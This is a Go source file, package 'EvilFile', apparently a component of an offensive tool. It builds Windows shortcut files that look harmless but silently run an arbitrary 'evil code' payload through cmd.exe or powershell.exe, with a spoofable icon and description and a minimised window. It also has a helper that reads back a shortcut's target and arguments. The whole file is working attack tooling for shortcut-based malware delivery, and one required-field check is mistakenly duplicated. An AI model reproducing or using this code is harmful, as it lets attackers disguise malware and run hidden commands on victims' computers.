package EvilFile

import (
	"log"
	"os/exec"
	"strings"
)

//Name	       : name of Shortcut         (required)
//
//Payload      : evil code                (required)
//
//path         : path of the shortcut     (required)
//
//Interface    : cmd.exe / powershell.exe (required)
//
//IconPath     : path of icon             (.exe / .ico)
//
//Description  : description if shortcut
type EvilLnk struct {
	Name        string
	IconPath    string
	Payload     string
	Description string
	Path        string
	Interface   string
}
type ReelLnk struct {
	Name        string
	IconPath    string
	Target      string
	Description string
	Args        string
}

//
func (shortcut *EvilLnk) Build() {
	payload := "$Shell = New-Object -ComObject (\"WScript.Shell\");"
	if shortcut.Interface == "" {
		log.Fatal("shortcut.Interface required Interface = cmd.exe or powershell.exe")
		return
	}
	if shortcut.Path == "" {
		log.Fatal("shortcut.Path required")
		return
	}
	if shortcut.Path == "" {
		log.Fatal("shortcut.Name required")
		return
	}
	if shortcut.Payload == "" {
		log.Fatal("shortcut.Payload required")
		return
	}
	payload += "$ShortCut = $Shell.CreateShortcut(\"" + shortcut.Path + shortcut.Name + "\");"

	if shortcut.IconPath != "" {
		payload += "$ShortCut.IconLocation = \"" + shortcut.IconPath + ", 0\";"
	}
	if strings.Contains(shortcut.Interface, "cmd") {
		payload += "$ShortCut.TargetPath=\"cmd.exe\";"
		payload += "$ShortCut.Arguments=' /C \"" + shortcut.Payload + "\"';"
	}
	if strings.Contains(shortcut.Interface, "powershell") {
		payload += "$ShortCut.TargetPath=\"powershell.exe\";"
		payload += "$ShortCut.Arguments='\"" + shortcut.Payload + "\"';"
	}
	if shortcut.Description != "" {
		payload += "$ShortCut.Description = \"" + shortcut.Description + "\";"
	}
	payload += "$ShortCut.WindowStyle = 7;"
	payload += "$ShortCut.Save()"

	_, err := exec.Command("powershell", payload).Output()
	if err != nil {
		log.Fatal(err)
	}
}

func GetLnkInfo(path string) ReelLnk {

	script := `$sh = New-Object -ComObject WScript.Shell;$lnk = $sh.CreateShortcut("` + path + `");Write-Host $lnk.TargetPath;Write-Host $lnk.Arguments;Write-Host $lnk.Description;`
	cmd, _ := exec.Command("powershell", script).Output()
	data := strings.Split(string(cmd), "\n")
	target := ReelLnk{
		Target:      data[0],
		Args:        data[1],
		Description: data[2],
	}
	return target
}
